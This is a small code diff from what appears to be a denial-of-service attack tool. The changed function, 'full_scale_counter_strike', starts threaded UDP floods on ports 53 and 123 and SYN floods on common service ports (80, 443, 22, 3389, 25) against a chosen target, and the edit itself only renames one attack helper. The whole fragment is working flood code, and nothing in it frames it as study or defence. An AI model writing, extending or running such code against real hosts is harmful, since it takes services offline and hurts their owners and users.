@@ -37,7 +37,7 @@ def full_scale_counter_strike(target):
     print("[+] Preparing L3/L4 vectors (UDP, SYN, ICMP, TCP Frag)...")
     for port in [53, 123]:  # UDP
         args = ("UDP-Mix", target, port, params["duration"], stop_event, pause_event, params["threads"])
-        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_UDP, args))
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_udp, args))
     for port in [80, 443, 22, 3389, 25]:  # SYN
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
         attack_threads.append(launch_attack_thread(counter_strike_helper.synflood, args))
